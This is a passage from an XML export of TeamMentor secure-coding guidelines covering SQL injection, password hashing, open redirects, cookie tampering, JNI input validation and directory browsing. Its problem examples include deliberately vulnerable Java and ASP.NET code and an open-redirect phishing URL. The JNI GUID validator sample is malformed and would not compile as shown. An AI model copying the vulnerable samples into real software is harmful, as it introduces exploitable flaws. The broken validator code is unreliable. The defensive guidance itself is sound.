?;";<br>PreparedStatement st = dbConnection.prepareStatement(dbStatement);<br>st.setString(1, user);<br>st.setString(2, passDigest);ResultSet rs = st.executeQuery();<br> if (rs.first())<br>{<br>      userIsValid = true;<br>      loginCount = rs.getInt(1);<br>}<br>else<br>{<br>      userIsValid = false;<br>}<br> rs.close();<br> if(userIsValid)<br>{<br>      if(loginCount &gt; 3)<br>      {<br>            throw new AccountIsLockedException();<br>      }<br>      resetLoginAttemptCounter(user);<br>      checkPasswordMaturity(user);<br>}<br>else<br>{<br>      updateLastLoginAttempt(user);<br>}</pre></blockquote><h1>Related Items</h1><ul><li><a href="ruledisplay:E42BF294-03A3-4753-9F12-556CDE2A347D">Guideline: Enforce Strong Passwords (Java Web Application)</a> </li><li><a href="ruledisplay:8EDBAC9F-BFCF-43DF-A4FA-5BB7E03E7410">Guideline: Do Not Leave Passwords in Memory (Java Web Application)</a> </li><li><a href="ruledisplay:7E520F82-948E-4D53-9923-1E219278138F">Attack: Denial of Service Attack</a> </li><li><a href="ruledisplay:6D0F24EA-B130-4AAE-9EDF-0B27F04B3145">Attack: Credentials Brute Force Attack</a> </li><li><a href="ruledisplay:A483E10E-2C4F-4947-863F-81CF93DD5FEA">Attack: Credentials Dictionary Attack</a> </li><li><a href="ruledisplay:A8C4CED5-3F8A-4589-8025-37E6207783D6">Attack: Account Lockout Attack</a> </li><li><a href="ruledisplay:99EC663A-5CC4-414B-B9C5-8D3E962B47CB">Checklist Item: Accounts Are Locked After Consecutive Failed Login Attempts (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-846199039" Content_Hash="-1060224388">
    <Metadata>
      <Id>06172387-2ef5-4547-a004-3fe3b5d33b87</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Store Only Salted Password Digests, not Plaintext Passwords</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Never store passwords directly in the user store.&nbsp; Instead, store a salted password hash. </p><h1>Why</h1><p>By storing your password with hashes and salt, you help prevent an attacker that gains access to your user store from obtaining the user passwords.&nbsp; If you use encryption, you have the added problem of securing the encryption key; hashes are not reversible and have no key to be compromised.&nbsp; If your credential store is compromised, the salt value helps to slow an attacker who is attempting to perform a dictionary attack.&nbsp; This gives you additional time to detect and react to the compromise. </p><h1>When</h1><p>All systems which need to store user passwords should store them hashed with salt. </p><h1>How</h1><p>Ideally, use a membership provider configured with hashed password.&nbsp; If you must implement your own user stores, store one-way password hashes with salt.&nbsp; Generate the hash from a combination of the password and a random salt value.&nbsp; Use a strong hashing algorithm such as SHA256. </p><h1>Additional Resources</h1><ul><li>For more information on How to configure&nbsp;hashed password&nbsp;for membership providers <a href="http://msdn2.microsoft.com/en-us/library/aa479048.aspx#bucupro_topic3">http://msdn2.microsoft.com/en-us/library/aa479048.aspx#bucupro_topic3</a></li></ul><br><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="533021061" Content_Hash="-1996235025">
    <Metadata>
      <Id>0ad428be-72ab-4438-b6c9-b585f0f54948</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Don&amp;#39;t Use Redirects or Forwards if Possible</Title>
      <Category>Input and Data Validation</Category>
      <Phase>Design</Phase>
      <Technology> Any</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority />
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Web Applications</li></ul><h1>What to Do</h1><p>Avoid using redirects or forwards if possible.</p><h1>Why</h1><p>Redirects or forwards may be manipulated by an attacker to create hyperlinks that appear to point to legitimate sites, but actually point to attacker-controlled malicious pages. This technique is oftened used by phishers to trick people into trusting a fake web site.</p><h1>When</h1><p>Use this guideline when writing a web application that uses redirects or forwards. Avoid using redirects or forwards in web applications, if possible.</p><h1>How</h1><p>Perform the following actions to avoid using redirects or forwards:</p><br><ol><li><p><strong>Enumerate redirects and forwards.</strong> Review application code to find all redirects and forwards used by the application.</p></li><li><p><strong>Review application design.</strong> Determine how redirects and forwards figure into the application design. Consider making design changes to remove the need for redirects and forwards.</p></li><li><p><strong>Remove redirects or forwards.</strong> Remove the redirects and forwards that are not necessary after changes to the application design.</p></li><li><p><strong>Secure the remaining redirects or forwards.</strong> If there appears to be no reasonable way to get rid of redirects or forwards, use related guidelines to secure the remaining redirects or forwards.</p></li></ol><h1>Problem Example</h1><p>Consider an on-line banking application that has an insecure redirect:</p><pre>http://www.onlinebank.com/redirect.asp?url=[destination]</pre><p>A phisher may create the following hyperlink to point to his own site and send it in spam messages to millions of people:</p><pre>http://www.onlinebank.com/redirect.asp?url=www.phisher.com</pre><p>When a user sees a link that appears to point to his bank at onlinebank.com in an e-mail message, he clicks that link and sees a web site that looks exactly like the bank's, but is actually a phishing web site used to steal authentication credentials. The user enters his account number and PIN into the web page, receives an error message telling him to try again, and is redirected to the bank's real site. After entering his credentials again, the user successfuly views his account. However, the phisher now has the user's online banking information.</p><h1>Solution Example</h1><p>The best solution to unvalidated redirects or forwards is to not use redirects or forwards at all. Considering the problem example above, a simple solution would be to remove the redirect.asp page after making the necessary changes to the application design.</p><h1>Additional Resources</h1><ul><li>For more information about unvalidated redirects and forwards, please see <a href="http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards">http://www.owasp.org/index.php/Top_10_2010-A10-Unvalidated_Redirects_and_Forwards</a> </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:f53c44e4-a08e-437c-a40d-ec3db00baca7">Calculate Destinations of Redirects and Forwards Without User Input</a></li><li><a href="ruledisplay:83896e9e-a4cd-434c-980a-276c660984da">Use Mapping Values When Redirecting on User Input</a></li><li><a href="ruledisplay:feea0d0c-ff5b-4c30-8f24-483fef3acb33">Validate Destinations of Redirects and Forwards</a></li><li><a href="ruledisplay:9680fe6b-230c-4794-9777-cae02aa597d7">URL Redirection Attack</a></li><li><a href="ruledisplay:1b4602a7-88c5-4255-8f39-4fae73546608">How to Test for URL Redirection Bugs</a></li><li><a href="ruledisplay:15e88928-1cbc-4fdd-8640-90319c81c178">Phishing Attack<br></a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="286184972" Content_Hash="-291139050">
    <Metadata>
      <Id>0ba54c5c-7064-4224-8d6d-b4906db5da59</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Use Type Safe SQL Parameters When Constructing SQL Queries</Title>
      <Category>Data Access</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP&nbsp;that interact with a database.</li></ul><h1>What to Do</h1><p>Use Prepared Statements to execute SQL statements. Do not generate SQL statements directly from user input.</p><h1>Why</h1><p>Parameterized Queries mitigate the number one risk for database-facing Web applications: SQL injection. This powerful attack is language independent, as it depends on the algorithm used to generate SQL strings passed to the database and affects the database engine, not the actual application.</p><p>It exploits the creation of the SQL string, in which user input is embedded manually with escape sequences (such as the single quote (<strong>'</strong>) or double quote (<strong>"</strong>) characters). Using this method, an attacker inserts valid SQL statement fragments as part of user input so they, in turn, are embedded within the SQL query that is submitted to the database engine for execution. Successful exploitation allows an attacker to potentially compromise the entire database and often the underlying operating system. </p><p>Parameterized Queries offer a simple yet efficient mitigation since they automatically contain user-input in a non-escaped form, "compiling" the query and passing the input as parameters, much like a function call. There is no known method of injecting custom SQL over Parameterized Queries.</p><p>Additionally, using Parameterized queries offers two significant advantages:</p><ul><li><strong>Greater Efficiency</strong>: The database engine needs to "compile" the statement only once, allowing for greater efficiency in query invocation. </li><li><strong>Greater Security</strong>: The database engine automatically handles the parsing and embedding of user input, effectively negating any potential for SQL injection due to attackers taking advantage of delimiter characters such as a single quote (<strong>'</strong>) or a double quote (<strong>"</strong>). </li></ul><h1>When</h1><p>Type-safe SQL parameters should be used whenever SQL statements need to be executed by the database. </p><h1>How</h1><p>One way of making the application less susceptible to SQL injection attacks is by using stored procedures. Stored procedures are subroutines stored in the database that are available to applications for accessing the data. </p><p>Just using stored procedures isn't a complete remedy for SQL injection. The important thing to do is use parameters with stored procedures, or else your stored procedures can be susceptible to SQL injection if they use unfiltered input. Stored procedures provide several security advantages: </p><ul><li>By parameterizing input parameters and type-enforcing them, user input is effectively filtered. </li><li>Stored procedures are allowed by most databases&nbsp;to execute under different security privileges than&nbsp;from the database user, thereby restricting the ability of the application to do anything beyond the actions specified in the stored procedures. For instance, an application would have execute access to a stored procedure but no access to the base tables. </li></ul><p>To use type-safe SQL parameters, follow these steps:</p><ol><li><p><strong>If possible, use stored procedures. </strong>Stored procedures are pre-compiled statements that are stored on the database server. Using stored procedures improves your application's performance and security. Consult the <a href="ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662">Use Stored Procedures</a> guideline for more details.</p></li><li><p><strong>Identify the SQL queries. </strong>Locate all SQL queries throughout your application. Example:</p><blockquote><pre>Connection cn = MyApp.getDBConnection();<br>Statement st = cn.createStatement();<br>String query = "select login_attempts from myappUsers where user = \"" + user<br>             + "\" and pass = \"" + new String(passDigest) + "\";";<br>ResultSet rs = st.executeQuery(query);</pre></blockquote></li><li><p><strong>Identify the parameters in each SQL query. </strong>After locating all SQL queries, identify the parameters in each query. Understand the format and type of each parameter's data.</p></li><li><p><strong>Use PreparedStatement. </strong>Java supports parameterized queries via its <strong>PreparedStatement</strong> class. <strong>PreparedStatement</strong> is mapped by most databases to a parameterized query or a stored procedure. Although the implementation may differ&nbsp;among databases, the functionality is the same. Turn all SQL queries into parameterized queries. To accomplish this, turn all <strong>Statement</strong> objects into <strong>PreparedStatement</strong> objects. For example, the SQL query from Step 1 would be:</p><blockquote><pre>Connection cn = MyApp.getDBConnection();<br>PreparedStatement st = cn.prepareStatement("select login_attempts from myappUsers"<br>                     + " where user = ? and pass = ?;");<br>st.setString(1, user);<br>st.setString(2, new String(passDigest));<br>ResultSet rs = st.executeQuery();</pre></blockquote><p>For more information, consult the documentation for <a href="http://java.sun.com/j2se/1.4.2/docs/api/java/sql/PreparedStatement.html">Class PreparedStatement</a> in the Java SDK.</p></li></ol><h1>Problem Example</h1><p>The following code validates the user based on a given username and password. It hashes the password with a random salt, then it compares the username and the produced hash against the data stored in the backend database. Unfortunately, the SQL query is dynamically crafted by using the user's input. If there is no proper input validation, an attacker can access the application's database server through the use of SQL injection.</p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>      // Hash the credentials before querying the credential store<br>      // The application crafts the SQL query based on user's input<br>      Connection cn = MyApp.getDBConnection();<br>      Statement st = cn.createStatement();<br>      String query = "select login_attempts from myappUsers where user = \""<br>                    + user + "\" and pass = \"" + passHash + "\";";<br>      ResultSet rs = st.executeQuery(query);<br>       // Execute the rest of the authentication steps<br>}</pre></blockquote><h1>Solution Example</h1><p>The following code validates the user based on given username and password. It hashes the password with a random salt, then it compares the username and the produced hash against the data stored in the backend database. Because the application uses <strong>PreparedStatement</strong>, it is much more difficult for an attacker to gain access to the application's database server through the use of SQL injection. </p><blockquote><pre>public boolean validateUser(String user, char[] pass)<br>{<br>      // Hash the credentials before querying the credential store<br>      // The application uses parameterized queries<br>      Connection cn = MyApp.getDBConnection();<br>      PreparedStatement st = cn.prepareStatement("select user from myappUsers"<br>                            + " where user = ? and pass = ?;");<br>      st.setString(1, user);<br>      st.setString(2, passHash);<br>      ResultSet rs = st.executeQuery();<br>       // Execute the rest of the authentication steps<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about using parameterized queries in Java, see: Documentation for <a href="http://java.sun.com/j2se/1.4.2/docs/api/java/sql/PreparedStatement.html">Interface PreparedStatement</a>. </li><li>For more information about preventing SQL injection attacks, visit: <a href="http://www.owasp.org/index.php/Reviewing_Code_for_SQL_Injection">Reviewing Code for SQL Injection</a> from OWASP. </li><li>To learn more about SQL server security, visit: <a href="http://www.sqlsecurity.com/">SQLSecurity.com</a>.</li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:ADE80907-B490-4FD3-81A8-826117E25662">Guideline: Use Stored Procedures (Java Web Application)</a> </li><li><a href="ruledisplay:81491E66-67B7-49F3-BDA6-4B4C9245C702">Guideline: Validate All Input Passed to Database (Java Web Application)</a> </li><li><a href="ruledisplay:D089D9CA-860C-4F98-BC7E-5AD7553DB6DD">Checklist Item: Client-Side Validation is Not Relied On (Java Web Application)</a> </li><li><a href="ruledisplay:AA3B4801-99BA-43B0-90A6-D38A605E8574">Checklist Item: Type Safe SQL Parameters are Used (Java Web Application)</a> </li><li><a href="ruledisplay:8515588C-661A-4962-853F-6CD6ABCD8CF6">Attack: Server-Side Code Injection Attack</a></li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-1040956955" Content_Hash="-1331855137">
    <Metadata>
      <Id>0eb30137-081e-4451-8ed2-36ff674d37d8</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Do Not Rely on Client State Management Options</Title>
      <Category>Session Management</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Avoid using any of the client-side state management options, such as view state, cookies, query strings, or hidden form fields, to store sensitive data. </p><h1>Why</h1><p>All information that is store on the client side can be tampered with by the client. Storing sensitive information on the client can compromise the integrity and confidentiality of your application's data. </p><h1>When</h1><p>Uniformly applicable whenever a sensitive info is being stored somewhere to maintain state. </p><h1>How</h1><p>Use the following steps when considering the use of client state management:</p><ol><li><p><strong>Identify sensitive information. </strong>Sensitive data is any information that is kept secret and should be disclosed only to authorized parties. Common examples of sensitive data include, but are not limited to, names of customers, government issued ID numbers, credit card and other financial information, passwords, and private keys. Some industries, such as health care and banking, have regulatory standards that define sensitive information. Use regulatory requirements, as they apply to your application, to identify sensitive data. Sensitive data can be defined as follows:</p><ul><li>Information that either contains personally identifiable information or can be used to derive personally identifiable information that should not be shared with others. </li><li>Information that a user provides that they would not want shared with other users of the application. </li><li>Information that comes from an external trusted source that is not designed to be shared with users.</li></ul><strong></strong></li><li><p><strong>Identify the use.</strong> Identify the use of the sensitive data. Consult with your application's design, functional requirements, and security documentation to determine whether it is necessary to use client state management for handling certain sensitive data. </p></li><li><p><strong>Choose appropriate management options.</strong> Sensitive data should always be stored into server-side state management options such as a database. If your application's documentation requires client state management, ensure that strong encryption is applied.</p></li><li><p><strong>Apply appropriate management options.</strong> Identify all uses of sensitive data. Ensure that the appropriate management options are applied.</p></li></ol><h1>Problem Example</h1><p>The following snippet shows an application that keeps track of the current user via the use of cookies. Unfortunately, an attacker can change the userID value of the cookie and impersonate another user.</p><pre>Response.Cookies["userID"].Value = "joe";</pre><h1>Solution Example</h1><p>The following snippet shows an application that keeps track of the current user via the use of server-side sessions. Therefore, it is impossible for an attacker to change the userID value and impersonate another user.</p><pre>Session["userID"] = "joe";</pre><h1>Additional Resources</h1><ul><li>To learn more about parameter manipulation and ways to prevent it, see: <a href="http://www.cgisecurity.com/owasp/html/ch11s04.html">Parameter Manipulation</a>. </li><li>To learn more about session management, see: <a href="http://www.securityfocus.com/infocus/1774">Basic Web Session Impersonation</a>.</li></ul><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-866248738" Content_Hash="847159120">
    <Metadata>
      <Id>1c35c0ac-2282-4f60-8879-3e1494350397</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Encrypt and Check Integrity of Authentication Cookies</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Encrypt all authentication cookies and check their integrity before trusting them. </p><h1>Why</h1><p>Unencrypted authentication cookies can be easily forged by attackers, allowing them to act as any user in the system.&nbsp; Simply relying on the existence of an authentication cookie without checking its integrity and the correctness of the values it contains may allow an attacker to spoof an authentication cookie with garbage data, again being able to access the site when they should not. </p><h1>When</h1><p>Whenever authentication cookies are used, they should be encrypted and have their integrity checked each time they are used before trusting them. </p><br><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-640324470" Content_Hash="1912789920">
    <Metadata>
      <Id>1e86ab18-716e-4761-b3f9-6ababeee2511</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Specify Hashed Password Format in Provider Configuration</Title>
      <Category>Authentication</Category>
      <Phase>Implementation</Phase>
      <Technology>ASP.NET 3.5</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>What to Do</h1><p>Specify a hashed password format in the configuration for you membership provider. </p><h1>Why</h1><p>By storing your password with hashes and salt, you help prevent an attacker that gains access to your user store from obtaining the user passwords.&nbsp; If you use encryption, you have the added problem of securing the encryption key; hashes are not reversible and have no key to be compromised.&nbsp; If your credential store is compromised, the salt value helps to slow an attacker who is attempting to perform a dictionary attack.&nbsp; This gives you additional time to detect and react to the compromise. </p><h1>When</h1><p>All systems which use membership providers should use a hashed password format. </p><h1>How</h1><p>Do not store user passwords either in plaintext or encrypted format.&nbsp; Instead, store password hashes with salt.&nbsp; Use one of the membership providers to help protect credentials in storage and where possible, specify a hashed password format on your provider configuration.</p><br><hr><p>Adapted from Microsoft patterns &amp; practices guidance. </p>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="510781354" Content_Hash="-534753636">
    <Metadata>
      <Id>21a9dbc2-dc93-46ea-b8a6-61e8398940c6</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Validate All Data Passed Between Native and Java Code</Title>
      <Category>Unmanaged Code</Category>
      <Phase>Implementation</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><ul><li>Applications written using Servlets or JSP.</li></ul><h1>What to Do</h1><p>Validate all data that is passed between Java code and native code.</p><h1>Why</h1><p>Unchecked input and/or output can lead to buffer overflows, injection based attacks such as SQL injection and cross-site scripting, etc., that can&nbsp;exploit weaknesses in the application.</p><h1>When</h1><p>Your application should always verify data that is passed between native code and Java.</p><h1>How</h1><p>There are several things to consider when validating input/output between native and Java code: </p><ol><li><p><strong>Check language barriers. </strong>Distinguishing&nbsp;the boundaries between native and Java code is very important. Because the Java sandbox provides multiple security checks to its code, it is important to know the boundary&nbsp;between&nbsp;where the Java sandbox ends and the compiled code begins&nbsp;to interact&nbsp;directly with the CPU, so you can&nbsp;compensate for&nbsp;the lack of such checks inside the native code.</p></li><li><p><strong>Validate for length, range, format and type. </strong>After discovering the language boundaries, determine the type, format and structure of the data that is passed between Java and native code. Build a validator for each type of data that is passed between the two environments. </p></li><li><p><strong>Construct a set of validators. </strong>Centralize your application's validators as it helps strengthen the code by limiting the amount of scattered validation code throughout your application. Place the set of validators on the language barriers. Your application should pass data between native and Java code only through its set of validators.</p><p>Consult with the <a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Validate Input for Length, Range, Format, and Type</a> guideline for more details.</p></li></ol><h1>Problem Example</h1><p>The following segment shows a JNI code that utilizes a COM object. Making the assumption that the Java code will handle data validation, the JNI segment does not verify that the passed input is a valid GUID. Since invalid GUIDs may cause unhandled exceptions, an attacker can force the application to disclose its call stack and possibly its source filenames.</p><blockquote><pre>#include &lt;jni.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;atlbase.h&gt;<br>#include &lt;windows.h&gt;<br>#include &lt;wtypes.h&gt;<br>JNIEXPORT jboolean<br>JNICALL Java_Identifier_invokeObject<br>      (JNIEnv * env, jobject jobj, jstring jguid)<br>{<br>      HRESULT result;<br>      CLSID clsid;<br>      IUnknown *pIunkn;<br>      LPWSTR guid;<br>      jboolean iscopy;<br>      jboolean ret = false;<br>      char* temp_guid = (*env)-&gt;GetStringUTFChars(env, jguid, &amp;iscopy);<br>      //The application fails to verify that the GUID is valid<br>      guid = SysAllocStringLen(0, 38);<br>      MultiByteToWideChar(CP_ACP, 0, temp_guid, -1, guid, 38);<br>      result = GUIDFromString(guid, &amp;clsid);<br>       ...<br>       return ret;<br>}</pre></blockquote><h1>Solution Example</h1><p>The following segment shows a JNI code that utilizes a COM object. Because the passed input is validated as being a GUID, the application reduces the risk of unhandled exceptions.</p><blockquote><pre>#include &lt;jni.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;fcntl.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;atlbase.h&gt;<br>#include &lt;windows.h&gt;<br>#include &lt;wtypes.h&gt;  <br>JNIEXPORT jboolean <br>JNICALL Java_Identifier_invokeObject<br>      (JNIEnv * env, jobject jobj, jstring jguid)<br>{<br>      HRESULT result;<br>      CLSID clsid;<br>      IUnknown *pIunkn;<br>      LPWSTR guid;<br>      jboolean iscopy;<br>      jboolean ret = false;<br>      char* temp_guid = (*env)-&gt;GetStringUTFChars(env, jguid, &amp;iscopy);<br>      // The application verifies that the input matches the criteria for a GUID<br>      if(!validGUID(temp_guid))<br>      {<br>            return ret;<br>      }<br>      guid = SysAllocStringLen(0, 38);<br>      MultiByteToWideChar(CP_ACP, 0, temp_guid, -1, guid, 38);<br>      result = GUIDFromString(guid, &amp;clsid);<br>       ...<br>      return ret;<br>}<br> bool validGUID(char *guid)<br>{<br>      // Check that GUID is of right length<br>      if(strlen(guid) != 38) return false;<br>      // Sample GUID: {1EF4A023-143A-4e0e-AD72-69C2C68C2D70<br>}<br>      if(guid[0]  != '{') return false;<br>      if(guid[9]  != '-') return false;<br>      if(guid[14] != '-') return false;<br>      if(guid[19] != '-') return false;<br>      if(guid[24] != '-') return false;<br>      if(guid[37] != '}') return false;<br>      int i=1;<br>      while(i&lt;37)<br>      {<br>            if((guid[i] &gt;= 'a' &amp;&amp; guid[i] &lt;= 'f')<br>                  || (guid[i] &gt;= 'A' &amp;&amp; guid[i] &lt;= 'F')<br>                  || (guid[i] &gt;= '0' &amp;&amp; guid[i] &lt;= '9')<br>            {<br>                  // GUID is valid<br>            }<br>            else<br>            {<br>                  return false;<br>            }<br>            i++;<br>            if(i == 9 || i == 14 || i == 19 || i == 24)<br>            {<br>                  i++;<br>            }<br>      }<br>       return true;<br>}</pre></blockquote><h1>Additional Resources</h1><ul><li>To learn more about JNI, see: <a href="http://java.sun.com/j2se/1.3/docs/guide/jni/spec/jniTOC.doc.html">Java Native Interface Specification</a>. </li><li>For more information about the security issues that JNI introduces, see: <a href="http://www.owasp.org/index.php/Unsafe_JNI">Unsafe JNI</a> from OWASP. </li></ul><h1>Related Items</h1><ul><li><a href="ruledisplay:DA8CCFC9-F04F-4913-B05E-F574D3E4A559">Guideline: Validate Input for Length, Range, Format, and Type (Java Web Application)</a> </li><li><a href="ruledisplay:935E30F8-67B9-4E5B-B6F6-18644DD62B3E">Guideline: Minimize the Number of Times Language Boundaries are Crossed (Java Web Application)</a> </li><li><a href="ruledisplay:37CE275C-4A57-42D1-904B-2262A7DA1AA2">Attack: Format String Attack</a> </li><li><a href="ruledisplay:B86F003F-DB0C-41D4-B31A-F9AE1BF7C9C1">Attack: Deserialization of Untrusted Data Attack</a> </li><li><a href="ruledisplay:208A476B-ABCA-4630-9D02-746C52F47017">Attack: XML Injection Attack</a> </li><li><a href="ruledisplay:C7AC7D00-4AEA-4AFA-AD2D-1E812664BA38">Attack: Canonicalization Attack</a> </li><li><a href="ruledisplay:092BC54D-5A7F-451F-9EB1-AB0A1F1708C0">Attack: LDAP Injection Attack</a> </li><li><a href="ruledisplay:1D4FA7AF-33F0-40D9-9665-A31DBF3D7764">Attack: SQL Injection Attack</a> </li><li><a href="ruledisplay:B9DD25F1-3C5C-40DD-A82E-464D0C02C14D">Attack: Command Injection Attack</a> </li><li><a href="ruledisplay:41BACAD4-8875-4F83-A9F6-C2263B23ABC4">Attack: File Name and Path Manipulation Attack</a> </li><li><a href="ruledisplay:1CCC080F-9290-4BD2-8A2C-6A45F59727B0">Attack: Xpath-XQuery Attack</a> </li><li><a href="ruledisplay:198CBDAF-3F87-4291-870D-8B6F077D8D36">Attack: AJAX Injection Attack</a> </li><li><a href="ruledisplay:D47CF578-0D27-4F11-B594-C508E50982B5">Checklist Item: All Data Passed Between Native and Java Code is Validated (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="1115049748" Content_Hash="-165647311">
    <Metadata>
      <Id>22701ae6-1207-4e89-b62c-537bd112fb84</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
      <Title>Disable Directory Browsing</Title>
      <Category>Deployment Considerations</Category>
      <Phase>Deployment</Phase>
      <Technology>Java</Technology>
      <Type>Guideline</Type>
      <DirectLink />
      <Tag />
      <Security_Demand />
      <Author />
      <Priority>2</Priority>
      <Status />
    </Metadata>
    <Content Sanitized="true" DataType="Html">
      <Data><![CDATA[<h1>Applies to</h1><p>Applications written using Servlets or JSP.</p><h1>What to Do</h1><p>Disable directory browsing for your application's web directories.</p><h1>Why</h1><p>Directory browsing allows an attacker to browse your application's directory structure in search of unprotected files and components.</p><h1>When</h1><p>Disable directory browsing at all times.</p><h1>How</h1><p>Use the following steps to successfully disable directory browsing:</p><ol><li><p><strong>Identify if directory browsing is enabled. </strong>Navigate to your application's directories. Identify&nbsp;whether your application's server correctly returns an HTTP error message. If it incorrectly returns&nbsp;the directory contents, continue with the following steps.</p></li><li><p><strong>Locate the default servlet's configuration. </strong>Open your application's deployment descriptor (e.g. web.xml), and locate the default servlet's configuration. If the default servlet is present, it is mapped to the root directory of your application. Example: </p><blockquote><pre>&lt;servlet&gt;<br>      &lt;servlet-name&gt;default_servlet&lt;/servlet-name&gt;<br>      &lt;servlet-class&gt;<br>            org.apache.catalina.servlets.DefaultServlet<br>      &lt;/servlet-class&gt;<br>&lt;/servlet&gt;<br>&lt;servlet-mapping&gt;<br>      &lt;servlet-name&gt;default_servlet&lt;/servlet-name&gt;<br>      &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;</pre></blockquote></li><li><p><strong>Deny directory browsing in the default servlet's configuration. </strong>Initialize the default servlet with the parameter <strong>listings</strong> set to <strong>false</strong>. Example:</p><blockquote><pre>&lt;servlet&gt;<br>      &lt;servlet-name&gt;default_servlet&lt;/servlet-name&gt;<br>      &lt;servlet-class&gt;<br>            org.apache.catalina.servlets.DefaultServlet<br>      &lt;/servlet-class&gt;<br>      <strong>&lt;init-param&gt;<br></strong>            &lt;param-name&gt;listings&lt;/param-name&gt;<br>            &lt;param-value&gt;false&lt;/param-value&gt;<br><strong>      &lt;/init-param&gt;<br></strong>&lt;/servlet&gt;<br>&lt;servlet-mapping&gt;<br>      &lt;servlet-name&gt;default_servlet&lt;/servlet-name&gt;<br>      &lt;url-pattern&gt;/&lt;/url-pattern&gt;<br>&lt;/servlet-mapping&gt;</pre></blockquote></li></ol><h1>Problem Example</h1><p>An application is deployed on a production server. Unfortunately, the developers did not disable directory browsing. This allows an attacker to search for unprotected configuration files.</p><h1>Solution Example</h1><p>An application is deployed on a production server. Because the developers have disabled directory browsing, it is impossible for an attacker to use HTTP browsing to search for unprotected configuration files.</p><h1>Related Items</h1><ul><li><a href="ruledisplay:E99B2092-A623-447A-8461-1FD8F860AA15">Guideline: Remove Test Interfaces (Java Web Application)</a> </li><li><a href="ruledisplay:4572037A-2166-4AD1-8E73-D623E468A7B9">Attack: Information Disclosure Attack</a> </li><li><a href="ruledisplay:1D7F6072-1A5F-472E-9D27-F15E396EAB2E">Attack: Forceful Browsing Attack</a> </li><li><a href="ruledisplay:1398DA02-651D-4798-95C3-7C3F8409004B">Checklist Item: Directory Browsing is Disabled (Java Web Application)</a> </li></ul>]]></Data>
    </Content>
  </TeamMentor_Article>
  <TeamMentor_Article Metadata_Hash="-263995202" Content_Hash="-1647361047">
    <Metadata>
      <Id>280d4fb4-9004-4304-8d93-a41b583f86cf</Id>
      <Library_Id>4738d445-bc9b-456c-8b35-a35057596c16</Library_Id>
